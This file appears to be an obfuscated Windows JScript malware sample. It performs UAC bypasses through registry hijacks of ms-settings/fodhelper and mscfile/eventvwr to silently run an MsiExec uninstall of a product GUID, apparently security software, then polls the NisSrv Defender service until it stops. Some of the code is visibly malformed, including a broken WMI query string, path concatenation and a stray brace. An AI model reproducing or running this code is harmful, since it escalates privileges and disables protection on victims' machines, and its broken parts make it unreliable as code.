function pmbskuecyftru(name) {
  var winmgmts_object = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name=+name+");
  utlxfzud = new Enumerator(winmgmts_object);
  bqijutotpzpmc = utlxfzud.item();
  var process_state = "";
  try {
    process_state = bqijutotpzpmc.State;
  } catch (e) {}
  return (process_state == "Running") ? true : false;
  
}
  NisSrv_lbl = "NisSrv";
  var wScriptShell_application = WScript.CreateObject("shell.application");
  var activeXObj_shell = new ActiveXObject("WScript.Shell");
  var get_obj_winmgmtsCIMV2 = GetObject("winmgmts:\\\\.\\root\\CIMV2");
  var lsiicx = get_obj_winmgmtsCIMV2.ExecQuery(
    "SELECT * FROM Win32_OperatingSystem",
    "WQL",
    48
  );
  var zynhqkeg = new Enumerator(lsiicx);
  var enum_item = zynhqkeg.item();
  var sysDirObj = enum_item.SystemDirectory;
  var versionObj = enum_item.Version;
  var arr = versionObj.split(".");
  if (arr[0] == "10") {
    activeXObj_shell.RegWrite(
      "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\",
      "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
      "REG_SZ"
    );
    activeXObj_shell.RegWrite(
      "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute",
      "",
      "REG_SZ"
    );
    wScriptShell_application.ShellExecute(
      "explorer.exe",
      +sysDirObj+"fodhelper.exe",
      "",
      "open",
      0
    );
    WScript.sleep(1e4);
    activeXObj_shell.RegDelete(
      "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"
    );
  } else {
    if (arr[0] == "6") {
      activeXObj_shell.RegWrite(
        "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\",
        "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
        "REG_SZ"
      );
      wScriptShell_application.ShellExecute(
        "explorer.exe",
        +sysDirObj+"\\eventvwr.exe",
        "",
        "open",
        0
      );
      WScript.sleep(1e4);
      activeXObj_shell.RegDelete(
        "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"
      );
    }
  }
  var iii = 0;
  while (true) {
    if (pmbskuecyftru(NisSrv_lbl)) {
      WScript.sleep(100);
    } else {
      break;
    }
    iii = iii + 1;
    if (iii == 900) {
      break;
    }
  }
}
